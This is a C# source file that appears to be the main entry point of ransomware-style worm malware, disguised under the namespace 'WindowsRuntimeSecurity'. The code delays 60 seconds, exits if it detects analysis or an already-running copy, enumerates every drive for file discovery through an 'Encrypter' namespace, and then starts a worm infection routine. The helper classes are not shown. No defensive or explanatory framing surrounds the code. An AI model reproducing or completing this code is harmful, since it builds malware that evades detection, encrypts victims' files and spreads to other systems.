using System;
using System.IO;
using System.Threading;
using WindowsRuntimeSecurity.Encrypter;
using WindowsRuntimeSecurity.MiscMethods;

namespace WindowsRuntimeSecurity;

internal class Program
{
	private static void Main(string[] args)
	{
		Thread.Sleep(60000);
		if (AntiAnalysis.IsAnalyzed())
		{
			Environment.Exit(1);
		}
		if (Persistence.AlreadyRunning())
		{
			Environment.Exit(1);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				DirectoryAndFileDiscovery.SearchFilesAndDirectories(driveInfo.Name.ToString());
			}
			catch
			{
			}
		}
		Worm.BeginInfection();
	}
}
